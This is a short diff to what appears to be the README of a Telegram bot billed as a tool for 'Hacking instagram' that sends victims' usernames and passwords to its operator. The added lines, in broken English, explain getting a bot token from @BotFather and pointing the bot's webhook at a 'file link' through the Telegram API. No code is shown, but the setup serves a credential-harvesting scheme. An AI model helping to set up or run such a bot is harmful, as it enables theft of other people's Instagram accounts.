@@ -9,13 +9,17 @@ Bot Information Get __Hacking__ *instagram*
 
 ```bash
 Simple Bot send Username and password
-Create Host and Create Web hook 
+
+Who geve Bot Token in Telegarm
+Just join this Bot @BotFather and Create your a first Token ();
+
+Who create Web Hook ..?
 Example: 
 https://api.telegram.org/bot
 
  TOKEN BOT 
 
-/setwebhook?url= file link
+/setwebhook?url=file link
 
 Like this... 
 
